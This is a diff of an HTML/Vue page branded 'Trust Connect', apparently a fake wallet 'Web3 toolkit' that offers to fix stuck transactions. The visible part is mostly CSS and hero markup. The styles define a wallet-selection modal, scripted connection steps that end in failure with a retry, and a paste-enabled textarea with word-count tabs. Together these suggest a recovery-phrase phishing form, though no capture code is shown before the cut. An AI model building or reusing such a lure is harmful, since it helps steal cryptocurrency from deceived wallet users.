@@ -1,250 +1,1101 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Trust Connect · dApp Protocol v3.2</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
-    <style>
-        body {
-            font-family: 'Inter', sans-serif;
-            background-color: #f8fafc;
-            color: #0f172a;
-        }
-        .glass-card {
-            background: white;
-            border: 1px solid #e2e8f0;
-            border-radius: 24px;
-            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.05), 0 2px 4px -1px rgba(0, 0, 0, 0.03);
-        }
-        .btn-primary {
-            background: #0035ff;
-            color: white;
-            border-radius: 16px;
-            transition: all 0.2s;
-        }
-        .btn-primary:hover {
-            background: #0026cc;
-            transform: translateY(-1px);
-        }
-        .status-dot {
-            width: 8px;
-            height: 8px;
-            border-radius: 50%;
-            display: inline-block;
-        }
-        .progress-bar {
-            height: 6px;
-            border-radius: 3px;
-            background: #e2e8f0;
-            overflow: hidden;
-        }
-        .progress-fill {
-            height: 100%;
-            border-radius: 3px;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <title>Trust Connect</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/vue/3.4.21/vue.global.prod.min.js"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --blue: #0500FF;
+      --blue2: #3B82F6;
+      --blue-light: #EEF0FF;
+      --blue-glow: rgba(5,0,255,0.08);
+      --green: #00D26A;
+      --green-light: #EAFBF1;
+      --orange: #F59E0B;
+      --orange-light: #FFF8EB;
+      --red: #EF4444;
+      --red-light: #FEF2F2;
+      --purple: #8B5CF6;
+      --purple-light: #F3F0FF;
+      --cyan: #06B6D4;
+      --cyan-light: #ECFEFF;
+      --white: #FFFFFF;
+      --bg: #F7F8FC;
+      --t1: #0B1426;
+      --t2: #5A6478;
+      --t3: #9DA5B4;
+      --border: #EAECF2;
+      --card: #FFFFFF;
+    }
+    *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+    body{
+      font-family:'Inter',-apple-system,BlinkMacSystemFont,sans-serif;
+      background:var(--white);min-height:100vh;min-height:100dvh;
+      -webkit-font-smoothing:antialiased;display:flex;justify-content:center;
+    }
+    #app{width:100%;max-width:430px;min-height:100vh;background:var(--white);overflow-x:hidden}
+
+    .nav{
+      position:sticky;top:0;z-index:50;
+      background:rgba(255,255,255,0.85);backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);
+      border-bottom:1px solid var(--border);
+      display:flex;align-items:center;justify-content:space-between;
+      padding:14px 20px;
+    }
+    .nav-logo{display:flex;align-items:center;gap:8px}
+    .nav-logo svg{width:26px;height:26px}
+    .nav-logo-text{font-size:16px;font-weight:800;color:var(--t1)}
+    .nav-logo-text span{color:var(--blue)}
+    .nav-status{
+      display:flex;align-items:center;gap:6px;
+      font-size:11px;font-weight:600;color:var(--green);
+      background:var(--green-light);padding:5px 10px;border-radius:20px;
+    }
+    .nav-dot{width:6px;height:6px;border-radius:50%;background:var(--green);animation:pulse 2s infinite}
+    @keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.5;transform:scale(1.4)}}
+
+    .hero{
+      position:relative;overflow:hidden;
+      padding:40px 24px 36px;text-align:center;
+      background:linear-gradient(180deg,var(--blue-glow) 0%,transparent 100%);
+    }
+    .hero-orbs{position:absolute;inset:0;pointer-events:none;overflow:hidden}
+    .orb{position:absolute;border-radius:50%;filter:blur(60px);opacity:.5}
+    .orb1{width:200px;height:200px;background:rgba(5,0,255,0.08);top:-60px;left:-40px;animation:orbFloat 8s ease-in-out infinite}
+    .orb2{width:160px;height:160px;background:rgba(0,210,106,0.06);bottom:-40px;right:-30px;animation:orbFloat 6s ease-in-out infinite reverse}
+    @keyframes orbFloat{0%,100%{transform:translate(0,0)}50%{transform:translate(15px,-15px)}}
+
+    .shield-wrap{
+      width:130px;height:130px;margin:0 auto 24px;
+      position:relative;z-index:1;
+      animation:float 4s ease-in-out infinite;
+    }
+    @keyframes float{0%,100%{transform:translateY(0)}50%{transform:translateY(-8px)}}
+    .shield-wrap svg{width:100%;height:100%;filter:drop-shadow(0 12px 40px rgba(5,0,255,0.15))}
+
+    .hero-badge{
+      display:inline-flex;align-items:center;gap:6px;
+      background:var(--blue-light);color:var(--blue);
+      font-size:11px;font-weight:700;padding:5px 12px;border-radius:20px;
+      margin-bottom:16px;letter-spacing:.5px;text-transform:uppercase;
+    }
+    .hero h1{
+      font-size:30px;font-weight:900;color:var(--t1);
+      line-height:1.15;letter-spacing:-.7px;margin-bottom:12px;
+      position:relative;z-index:1;
+    }
+    .hero h1 em{font-style:normal;background:linear-gradient(135deg,var(--blue),var(--blue2));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+    .hero p{font-size:14.5px;color:var(--t2);line-height:1.55;max-width:320px;margin:0 auto;position:relative;z-index:1}
+
+    .stats{display:flex;justify-content:center;gap:8px;padding:24px 16px 0}
+    .stat-card{
+      flex:1;background:var(--card);border:1.5px solid var(--border);
+      border-radius:16px;padding:14px 8px;text-align:center;
+      transition:all .2s;
+    }
+    .stat-card:active{transform:scale(.97)}
+    .stat-val{font-size:20px;font-weight:800;color:var(--t1);letter-spacing:-.3px}
+    .stat-val span{color:var(--blue)}
+    .stat-lbl{font-size:10.5px;color:var(--t3);margin-top:2px;font-weight:500}
+
+    .ticker-wrap{
+      overflow:hidden;padding:20px 0 8px;
+      position:relative;
+    }
+    .ticker-wrap::before,.ticker-wrap::after{
+      content:'';position:absolute;top:0;bottom:0;width:40px;z-index:2;pointer-events:none;
+    }
+    .ticker-wrap::before{left:0;background:linear-gradient(90deg,var(--white),transparent)}
+    .ticker-wrap::after{right:0;background:linear-gradient(270deg,var(--white),transparent)}
+    .ticker{
+      display:flex;gap:12px;
+      animation:scroll 25s linear infinite;
+      width:max-content;
+    }
+    @keyframes scroll{0%{transform:translateX(0)}100%{transform:translateX(-50%)}}
+    .tick-item{
+      display:flex;align-items:center;gap:8px;
+      background:var(--bg);border-radius:12px;padding:8px 14px;
+      white-space:nowrap;flex-shrink:0;
+    }
+    .tick-icon{width:22px;height:22px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:12px;color:#fff;flex-shrink:0}
+    .tick-sym{font-size:12.5px;font-weight:700;color:var(--t1)}
+    .tick-price{font-size:12px;font-weight:600;color:var(--t2)}
+    .tick-chg{font-size:11px;font-weight:700;padding:2px 6px;border-radius:6px}
+    .tick-up{color:#059669;background:#D1FAE5}
+    .tick-dn{color:#DC2626;background:#FEE2E2}
+
+    .sec-title{
+      font-size:18px;font-weight:800;color:var(--t1);
+      padding:28px 20px 4px;letter-spacing:-.3px;
+    }
+    .sec-sub{font-size:13px;color:var(--t2);padding:0 20px 16px;line-height:1.4}
+
+    .tools-grid{
+      display:grid;grid-template-columns:1fr 1fr;gap:10px;
+      padding:0 16px 8px;
+    }
+    .tool-card{
+      background:var(--card);border:1.5px solid var(--border);
+      border-radius:20px;padding:18px 16px;
+      cursor:pointer;transition:all .2s;position:relative;overflow:hidden;
+    }
+    .tool-card:active{transform:scale(.97)}
+    .tool-card:hover{border-color:#D0D5DD}
+    .tool-icon{
+      width:44px;height:44px;border-radius:14px;
+      display:flex;align-items:center;justify-content:center;
+      margin-bottom:12px;
+    }
+    .tool-icon svg{width:22px;height:22px}
+    .tool-name{font-size:14px;font-weight:700;color:var(--t1);margin-bottom:3px}
+    .tool-desc{font-size:11.5px;color:var(--t2);line-height:1.35}
+    .tool-tag{
+      display:inline-block;margin-top:8px;
+      font-size:10px;font-weight:700;
+      padding:3px 8px;border-radius:8px;
+      text-transform:uppercase;letter-spacing:.3px;
+    }
+
+    .features-scroll{
+      display:flex;gap:12px;
+      padding:0 16px 8px;
+      overflow-x:auto;scroll-snap-type:x mandatory;
+      -webkit-overflow-scrolling:touch;
+      scrollbar-width:none;
+    }
+    .features-scroll::-webkit-scrollbar{display:none}
+    .feat-card{
+      min-width:260px;scroll-snap-align:start;
+      background:var(--card);border:1.5px solid var(--border);
+      border-radius:20px;padding:20px 18px;flex-shrink:0;
+      position:relative;overflow:hidden;
+    }
+    .feat-card::after{
+      content:'';position:absolute;top:0;right:0;
+      width:80px;height:80px;border-radius:50%;
+      filter:blur(40px);opacity:.3;pointer-events:none;
+    }
+    .feat-num{
+      font-size:40px;font-weight:900;
+      opacity:.07;position:absolute;top:10px;right:16px;
+      color:var(--t1);
+    }
+    .feat-icon{
+      width:40px;height:40px;border-radius:12px;
+      display:flex;align-items:center;justify-content:center;
+      margin-bottom:14px;
+    }
+    .feat-icon svg{width:20px;height:20px}
+    .feat-title{font-size:15px;font-weight:700;color:var(--t1);margin-bottom:4px}
+    .feat-desc{font-size:12.5px;color:var(--t2);line-height:1.4}
+
+    .net-section{padding:0 16px 8px}
+    .net-card{
+      background:linear-gradient(135deg,#0B1426 0%,#1a2744 100%);
+      border-radius:24px;padding:22px 20px;color:#fff;
+      position:relative;overflow:hidden;
+    }
+    .net-card::before{
+      content:'';position:absolute;top:-30px;right:-30px;
+      width:120px;height:120px;border-radius:50%;
+      background:rgba(5,0,255,0.2);filter:blur(40px);
+    }
+    .net-header{display:flex;align-items:center;justify-content:space-between;margin-bottom:18px}
+    .net-title{font-size:15px;font-weight:700}
+    .net-live{
+      display:flex;align-items:center;gap:5px;
+      font-size:11px;font-weight:600;color:var(--green);
+      background:rgba(0,210,106,0.15);padding:4px 10px;border-radius:12px;
+    }
+    .net-grid{display:flex;gap:12px}
+    .net-item{flex:1;text-align:center}
+    .net-item-val{font-size:18px;font-weight:800;letter-spacing:-.3px}
+    .net-item-lbl{font-size:10px;color:rgba(255,255,255,0.5);margin-top:2px;font-weight:500}
+    .net-bar-wrap{margin-top:16px}
+    .net-bar-label{display:flex;justify-content:space-between;font-size:10.5px;color:rgba(255,255,255,0.5);margin-bottom:6px}
+    .net-bar{height:6px;background:rgba(255,255,255,0.1);border-radius:3px;overflow:hidden}
+    .net-bar-fill{height:100%;border-radius:3px;transition:width 1s ease}
+
+    .problems{padding:0 16px 8px;display:flex;flex-direction:column;gap:8px}
+    .prob-item{
+      display:flex;align-items:center;gap:14px;
+      padding:16px;background:var(--card);border:1.5px solid var(--border);
+      border-radius:18px;cursor:pointer;transition:all .2s;
+    }
+    .prob-item:active{transform:scale(.985)}
+    .prob-icon{
+      width:42px;height:42px;border-radius:12px;
+      display:flex;align-items:center;justify-content:center;flex-shrink:0;
+    }
+    .prob-icon svg{width:20px;height:20px}
+    .prob-text{flex:1}
+    .prob-title{font-size:14px;font-weight:700;color:var(--t1)}
+    .prob-desc{font-size:12px;color:var(--t2);margin-top:1px}
+    .prob-arrow{width:18px;height:18px;color:var(--t3);flex-shrink:0}
+    .prob-badge{
+      font-size:9.5px;font-weight:700;padding:2px 7px;border-radius:6px;
+      flex-shrink:0;text-transform:uppercase;letter-spacing:.3px;
+    }
+
+    .cta-section{padding:28px 16px 8px}
+    .btn-primary{
+      width:100%;padding:17px;border:none;border-radius:18px;
+      font-size:16.5px;font-weight:700;background:var(--blue);color:var(--white);
+      cursor:pointer;transition:all .2s;
+      box-shadow:0 6px 28px rgba(5,0,255,0.3);
+      display:flex;align-items:center;justify-content:center;gap:10px;
+    }
+    .btn-primary:active{transform:scale(.98);box-shadow:0 3px 14px rgba(5,0,255,0.25)}
+    .btn-primary svg{width:20px;height:20px}
+    .btn-secondary{
+      width:100%;padding:17px;margin-top:10px;
+      border:2px solid var(--border);border-radius:18px;
+      font-size:16.5px;font-weight:700;background:var(--white);color:var(--t1);
+      cursor:pointer;transition:all .2s;
+      display:flex;align-items:center;justify-content:center;gap:10px;
+    }
+    .btn-secondary:active{transform:scale(.98);background:var(--bg)}
+    .btn-secondary svg{width:20px;height:20px;color:var(--blue)}
+
+    .trust-badges{
+      display:flex;justify-content:center;gap:24px;
+      padding:24px 20px 8px;
+    }
+    .trust-b{display:flex;align-items:center;gap:5px;font-size:11.5px;color:var(--t2);font-weight:500}
+    .trust-b svg{width:14px;height:14px;color:var(--green)}
+
+    .footer{
+      padding:20px 20px calc(env(safe-area-inset-bottom,8px) + 16px);
+      text-align:center;
+    }
+    .footer-links{display:flex;justify-content:center;gap:20px;margin-bottom:8px}
+    .footer-links a{font-size:12px;color:var(--t3);text-decoration:none;font-weight:500}
+    .footer-copy{font-size:10.5px;color:#C5CBD6}
+
+    .modal-overlay{
+      position:fixed;inset:0;z-index:200;
+      display:flex;justify-content:center;align-items:flex-end;
+      animation:modalFadeIn .25s ease;
+    }
+    .modal-overlay.closing{ animation:modalFadeOut .2s ease forwards; }
+    .modal-backdrop{
+      position:absolute;inset:0;
+      background:rgba(11,20,38,0.5);
+      backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px);
+    }
+    @keyframes modalFadeIn{from{opacity:0}to{opacity:1}}
+    @keyframes modalFadeOut{from{opacity:1}to{opacity:0}}
+
+    @media(min-width:480px){
+      .modal-overlay{align-items:center;padding:24px}
+    }
+
+    .modal-sheet{
+      position:relative;z-index:1;
+      background:var(--white);
+      border-radius:28px 28px 0 0;
+      width:100%;max-width:400px;
+      max-height:88vh;max-height:88dvh;
+      overflow-y:auto;overflow-x:hidden;
+      box-shadow:0 -12px 60px rgba(0,0,0,0.15);
+      animation:modalSlideUp .4s cubic-bezier(0.16,1,0.3,1);
+      padding-bottom:env(safe-area-inset-bottom,20px);
+    }
+    .modal-overlay.closing .modal-sheet{animation:modalSlideDown .25s ease forwards}
+
+    @media(min-width:480px){
+      .modal-sheet{
+        border-radius:28px;
+        animation:modalScaleIn .35s cubic-bezier(0.16,1,0.3,1);
+        box-shadow:0 25px 80px rgba(0,0,0,0.18),0 0 0 1px rgba(0,0,0,0.04);
+      }
+      .modal-overlay.closing .modal-sheet{animation:modalScaleOut .2s ease forwards}
+    }
+    @keyframes modalSlideUp{from{transform:translateY(100%)}to{transform:translateY(0)}}
+    @keyframes modalSlideDown{from{transform:translateY(0)}to{transform:translateY(100%)}}
+    @keyframes modalScaleIn{from{transform:scale(.92) translateY(12px);opacity:0}to{transform:scale(1) translateY(0);opacity:1}}
+    @keyframes modalScaleOut{from{transform:scale(1);opacity:1}to{transform:scale(.92);opacity:0}}
+    .modal-sheet::-webkit-scrollbar{width:0}
+
+    .modal-drag{width:36px;height:5px;background:#D4D8E1;border-radius:3px;margin:10px auto 0}
+    @media(min-width:480px){.modal-drag{display:none}}
+
+    .modal-hdr{
+      display:flex;align-items:center;justify-content:space-between;
+      padding:20px 22px 6px;
+    }
+    .modal-hdr-left{display:flex;align-items:center;gap:9px}
+    .modal-hdr-left svg{width:22px;height:22px}
+    .modal-hdr-title{font-size:19px;font-weight:700;color:var(--t1);letter-spacing:-.2px}
+
+    .modal-close{
+      width:34px;height:34px;border-radius:50%;
+      background:#F0F2F5;border:none;
+      display:flex;align-items:center;justify-content:center;
+      cursor:pointer;transition:all .15s;
+    }
+    .modal-close:active{transform:scale(.88);background:#E0E3E9}
+    .modal-close svg{width:16px;height:16px;color:#8892A2}
+
+    .modal-sub{padding:6px 22px 16px;font-size:13px;color:var(--t2);line-height:1.4}
+
+    .wl-list{padding:0 14px 8px;display:flex;flex-direction:column;gap:6px}
+    .wl-item{
+      display:flex;align-items:center;gap:14px;
+      padding:13px 14px;border-radius:18px;
+      border:2px solid transparent;
+      cursor:pointer;transition:all .2s cubic-bezier(.25,.46,.45,.94);
+      background:var(--white);user-select:none;-webkit-user-select:none;
+    }
+    .wl-item:active{transform:scale(.985)}
+    .wl-item.sel{background:var(--blue-light);border-color:var(--blue)}
+    .wl-item:not(.sel):hover{background:var(--bg)}
+
+    .wl-icon{
+      width:44px;height:44px;border-radius:13px;
+      display:flex;align-items:center;justify-content:center;
+      font-size:17px;font-weight:800;color:#fff;flex-shrink:0;
+    }
+    .wl-info{flex:1;min-width:0}
+    .wl-name{font-size:15px;font-weight:600;color:var(--t1)}
+    .wl-tag{font-size:11.5px;color:var(--t3);margin-top:1px}
+
+    .wl-radio{
+      width:22px;height:22px;border-radius:50%;
+      border:2px solid #CDD3DC;
+      display:flex;align-items:center;justify-content:center;
+      flex-shrink:0;transition:all .2s;
+    }
+    .wl-item.sel .wl-radio{
+      border-color:var(--blue);background:var(--blue);
+      box-shadow:0 2px 10px rgba(5,0,255,0.3);
+    }
+    .wl-dot{
+      width:8px;height:8px;border-radius:50%;background:#fff;
+      opacity:0;transform:scale(0);
+      transition:all .25s cubic-bezier(.34,1.56,.64,1);
+    }
+    .wl-item.sel .wl-dot{opacity:1;transform:scale(1)}
+
+    .modal-divider{height:1px;background:var(--border);margin:8px 22px 14px}
+
+    .modal-btn{
+      display:block;width:calc(100% - 32px);
+      margin:6px 16px 12px;padding:16px;
+      border:none;border-radius:16px;
+      font-size:16px;font-weight:700;
+      cursor:pointer;transition:all .2s;text-align:center;
+    }
+    .modal-btn.on{
+      background:var(--blue);color:var(--white);
+      box-shadow:0 6px 24px rgba(5,0,255,0.3);
+    }
+    .modal-btn.on:active{transform:scale(.985)}
+    .modal-btn.off{background:#ECEEF2;color:#B0B7C3;pointer-events:none}
+
+    .modal-foot{text-align:center;padding:4px 22px 16px;font-size:12px;color:var(--t3);line-height:1.5}
+    .modal-foot a{color:var(--blue);text-decoration:none;font-weight:500}
+
+    .connect-spinner{
+      width:80px;height:80px;margin:0 auto;position:relative;
+    }
+    .connect-spinner svg{width:100%;height:100%}
+    .spin-arc{animation:spinRotate 1.2s linear infinite;transform-origin:center}
+    @keyframes spinRotate{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
+    .connect-spinner-icon{
+      position:absolute;inset:0;display:flex;align-items:center;justify-content:center;
+    }
+
+    .connect-steps{
+      display:flex;flex-direction:column;gap:10px;
+      margin-top:28px;text-align:left;
+      padding:0 20px;
+    }
+    .connect-step{
+      display:flex;align-items:center;gap:10px;
+      font-size:13px;font-weight:500;color:var(--t3);
+      transition:all .3s;
+    }
+    .connect-step.active{color:var(--blue);font-weight:600}
+    .connect-step.done{color:var(--green);font-weight:600}
+    .connect-step.failed{color:var(--red);font-weight:600}
+
+    .connect-step-dot{
+      width:8px;height:8px;border-radius:50%;
+      background:var(--border);flex-shrink:0;
+      transition:all .3s;
+    }
+    .connect-step.active .connect-step-dot{
+      background:var(--blue);
+      box-shadow:0 0 0 4px rgba(5,0,255,0.15);
+      animation:pulse 1.5s infinite;
+    }
+    .connect-step.done .connect-step-dot{background:var(--green)}
+    .connect-step.failed .connect-step-dot{
+      background:var(--red);
+      box-shadow:0 0 0 4px rgba(239,68,68,0.15);
+    }
+
+    .error-icon-wrap{width:64px;height:64px;margin:0 auto}
+    .error-icon-wrap svg{width:100%;height:100%;animation:errorShake .5s ease}
+    @keyframes errorShake{
+      0%,100%{transform:translateX(0)}
+      15%{transform:translateX(-6px)}
+      30%{transform:translateX(6px)}
+      45%{transform:translateX(-4px)}
+      60%{transform:translateX(4px)}
+      75%{transform:translateX(-2px)}
+    }
+
+    .error-details{
+      margin-top:18px;
+      background:#FAFBFC;border:1px solid var(--border);border-radius:14px;
+      padding:12px 16px;text-align:left;
+    }
+    .error-detail-row{
+      display:flex;justify-content:space-between;align-items:center;
+      padding:6px 0;
+    }
+    .error-detail-row+.error-detail-row{border-top:1px solid var(--border)}
+    .error-detail-label{font-size:12px;color:var(--t3);font-weight:500}
+    .error-detail-val{font-size:12px;font-weight:600;color:var(--t1);font-family:'SF Mono','Fira Code',monospace}
+
+    .error-retry-btn{
+      width:100%;padding:14px;margin-top:10px;
+      border:2px solid var(--border);border-radius:16px;
+      font-size:15px;font-weight:700;color:var(--t2);
+      background:var(--white);cursor:pointer;transition:all .2s;
+    }
+    .error-retry-btn:active{transform:scale(.98);background:var(--bg)}
+
+    .r-desc{padding:8px 22px 18px;font-size:13.5px;color:var(--t2);line-height:1.45}
+    .r-tabs{display:flex;gap:8px;padding:0 20px 16px}
+    .r-tab{
+      flex:1;padding:11px 0;border-radius:12px;border:none;
+      font-size:15px;font-weight:700;cursor:pointer;transition:all .2s;text-align:center;
+    }
+    .r-tab.on{background:var(--blue);color:var(--white);box-shadow:0 3px 12px rgba(5,0,255,0.25)}
+    .r-tab:not(.on){background:#F0F2F5;color:var(--t2)}
+    .r-tab:active{transform:scale(.97)}
+
+    .r-area{margin:0 20px 12px;position:relative}
+    .r-textarea{
+      width:100%;min-height:130px;padding:16px 52px 16px 18px;
+      border:2px solid var(--blue);border-radius:16px;
+      font-family:'SF Mono','Fira Code','Consolas',monospace;
+      font-size:15px;line-height:1.6;color:var(--t1);
+      background:#FAFBFC;resize:none;outline:none;
+      transition:border-color .2s,box-shadow .2s;
+    }
+    .r-textarea:focus{box-shadow:0 0 0 4px rgba(5,0,255,0.08);background:var(--white)}
+    .r-textarea::placeholder{color:var(--t3);font-family:'Inter',sans-serif;font-size:14px}
+    .r-paste{
+      position:absolute;bottom:14px;right:14px;
+      width:38px;height:38px;border-radius:50%;
+      background:var(--blue-light);border:none;cursor:pointer;
+      display:flex;align-items:center;justify-content:center;transition:all .15s;
+    }
+    .r-paste:active{transform:scale(.88)}
+    .r-paste svg{width:18px;height:18px;color:var(--blue)}
+
+    .r-count{
+      padding:0 24px 4px;font-size:12px;color:var(--t3);
+      display:flex;justify-content:space-between;margin-bottom:10px;
+    }
+    .r-count .ok{color:var(--green);font-weight:600}
+    .r-count .no{color:var(--red);font-weight:600}
+
+    .r-footer{text-align:center;padding:6px 22px 18px;font-size:12px;color:var(--t3);line-height:1.5}
+
+    .modal-back{
+      width:34px;height:34px;border-radius:50%;
+      background:#F0F2F5;border:none;
+      display:flex;align-items:center;justify-content:center;
+      cursor:pointer;transition:all .15s;margin-right:8px;
+    }
+    .modal-back:active{transform:scale(.88);background:#E0E3E9}
+    .modal-back svg{width:16px;height:16px;color:#8892A2}
+
+    .tg-report-btn{
+      position:fixed;bottom:20px;right:20px;
+      width:56px;height:56px;border-radius:28px;
+      background:var(--blue);border:none;
+      box-shadow:0 4px 20px rgba(5,0,255,0.4);
+      display:flex;align-items:center;justify-content:center;
+      cursor:pointer;transition:all .2s;
+      z-index:100;
+    }
+    .tg-report-btn:active{transform:scale(.92)}
+    .tg-report-btn svg{width:28px;height:28px;color:#fff}
+
+    .toast{
+      position:fixed;bottom:90px;right:20px;left:20px;
+      max-width:360px;margin:0 auto;
+      background:#0B1426;color:#fff;
+      padding:14px 18px;border-radius:20px;
+      box-shadow:0 10px 30px rgba(0,0,0,0.3);
+      display:flex;align-items:center;gap:12px;
+      z-index:1000;animation:toastSlide .3s ease;
+    }
+    @keyframes toastSlide{
+      from{transform:translateY(20px);opacity:0}
+      to{transform:translateY(0);opacity:1}
+    }
+    .toast-icon{width:24px;height:24px;border-radius:12px;background:var(--green-light);display:flex;align-items:center;justify-content:center;flex-shrink:0}
+    .toast-icon svg{width:14px;height:14px;color:var(--green)}
+    .toast-content{flex:1;font-size:13px;font-weight:500;line-height:1.4}
+    .toast-close{
+      width:30px;height:30px;border-radius:15px;
+      background:rgba(255,255,255,0.1);border:none;
+      display:flex;align-items:center;justify-content:center;
+      cursor:pointer;flex-shrink:0;
+    }
+    .toast-close svg{width:14px;height:14px;color:#fff}
+
+    .report-field{
+      margin:0 20px 16px;
+      background:#FAFBFC;border:1.5px solid var(--border);
+      border-radius:16px;padding:14px;
+    }
+    .report-label{
+      font-size:12px;font-weight:600;color:var(--t3);
+      margin-bottom:4px;text-transform:uppercase;letter-spacing:.5px;
+    }
+    .report-value{
+      font-size:14px;font-weight:600;color:var(--t1);
+      word-break:break-all;
+    }
+    .report-select{
+      width:100%;padding:14px;
+      border:2px solid var(--border);border-radius:16px;
+      font-size:14px;color:var(--t1);background:var(--white);
+      margin-bottom:16px;outline:none;transition:all .2s;
+    }
+    .report-select:focus{border-color:var(--blue)}
+    .report-textarea{
+      width:100%;min-height:100px;
+      padding:14px;border:2px solid var(--border);
+      border-radius:16px;font-size:14px;color:var(--t1);
+      background:var(--white);resize:none;margin-bottom:16px;
+      outline:none;transition:all .2s;
+    }
+    .report-textarea:focus{border-color:var(--blue)}
+  </style>
 </head>
-<body class="pb-20">
+<body>
+<div id="app">
 
-    <!-- Header -->
-    <header class="max-w-2xl mx-auto px-6 py-6 flex justify-between items-center">
-        <div class="flex items-center gap-2">
-            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                <path d="M12 2L3 7V12C3 17.41 6.84 22.38 12 24C17.16 22.38 21 17.41 21 12V7L12 2Z" fill="#0035ff"/>
-                <path d="M9 12L11 14L15 10" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
-            </svg>
-            <span class="font-bold text-lg">Trust <span class="text-blue-700">Connect</span></span>
+  <nav class="nav">
+    <div class="nav-logo">
+      <svg viewBox="0 0 26 26" fill="none"><path d="M13 2L3 7v6c0 6.5 4.3 12.5 10 14 5.7-1.5 10-7.5 10-14V7L13 2z" fill="#0500FF"/><path d="M9.5 13l2.5 2.5 4.5-4.5" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+      <span class="nav-logo-text">Trust <span>Connect</span></span>
+    </div>
+    <div class="nav-status"><div class="nav-dot"></div>Mainnet</div>
+  </nav>
+
+  <section class="hero">
+    <div class="hero-orbs"><div class="orb orb1"></div><div class="orb orb2"></div></div>
+    <div class="shield-wrap">
+      <svg viewBox="0 0 160 160" fill="none">
+        <defs>
+          <linearGradient id="sg" x1="20" y1="10" x2="140" y2="150" gradientUnits="userSpaceOnUse">
+            <stop offset="0%" stop-color="#0500FF"/><stop offset="45%" stop-color="#3B82F6"/><stop offset="100%" stop-color="#00D26A"/>
+          </linearGradient>
+          <linearGradient id="sf" x1="40" y1="30" x2="120" y2="130" gradientUnits="userSpaceOnUse">
+            <stop offset="0%" stop-color="#3B82F6" stop-opacity=".25"/><stop offset="100%" stop-color="#0500FF" stop-opacity=".08"/>
+          </linearGradient>
+        </defs>
+        <path d="M80 12L20 42v34c0 34 25 66 60 72 35-6 60-38 60-72V42L80 12z" fill="url(#sf)" stroke="url(#sg)" stroke-width="3"/>
+        <line x1="44" y1="52" x2="116" y2="52" stroke="#3B82F6" stroke-width=".7" opacity=".3"/>
+        <line x1="44" y1="72" x2="116" y2="72" stroke="#3B82F6" stroke-width=".7" opacity=".3"/>
+        <line x1="44" y1="92" x2="116" y2="92" stroke="#3B82F6" stroke-width=".7" opacity=".25"/>
+        <line x1="60" y1="38" x2="60" y2="115" stroke="#3B82F6" stroke-width=".7" opacity=".25"/>
+        <line x1="80" y1="32" x2="80" y2="120" stroke="#3B82F6" stroke-width=".7" opacity=".3"/>
+        <line x1="100" y1="38" x2="100" y2="115" stroke="#3B82F6" stroke-width=".7" opacity=".25"/>
+        <circle cx="80" cy="72" r="18" fill="none" stroke="#00D26A" stroke-width="2.2" opacity=".6"/>
+        <circle cx="80" cy="72" r="6" fill="#00D26A" opacity=".5"/>
+        <path d="M34 40Q80 22 126 40" stroke="#fff" stroke-width="1.5" opacity=".2" fill="none"/>
+      </svg>
+    </div>
+    <div class="hero-badge"><div class="nav-dot"></div>dApp Protocol v3.2</div>
+    <h1>Advanced <em>Web3</em> toolkit for your wallet</h1>
+    <p>Diagnose issues, resolve stuck transactions, manage dApp connections and optimize your on-chain experience.</p>
+  </section>
+
+  <div class="stats">
+    <div class="stat-card" v-for="s in stats" :key="s.l">
+      <div class="stat-val" v-html="s.v"></div>
+      <div class="stat-lbl">{{s.l}}</div>
+    </div>
+  </div>
+
+  <div class="ticker-wrap">
+    <div class="ticker">
+      <div class="tick-item" v-for="t in tickerData.concat(tickerData)" :key="t.s+Math.random()">
+        <div class="tick-icon" :style="{background:t.c}">{{t.e}}</div>
+        <span class="tick-sym">{{t.s}}</span>
+        <span class="tick-price">{{t.p}}</span>
+        <span class="tick-chg" :class="t.d==='up'?'tick-up':'tick-dn'">{{t.ch}}</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="cta-section" style="padding-top:12px">
+    <button class="btn-primary" @click="modal='connect'">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+      Connect Wallet
+    </button>
+    <button class="btn-secondary" @click="runDiagnostics">
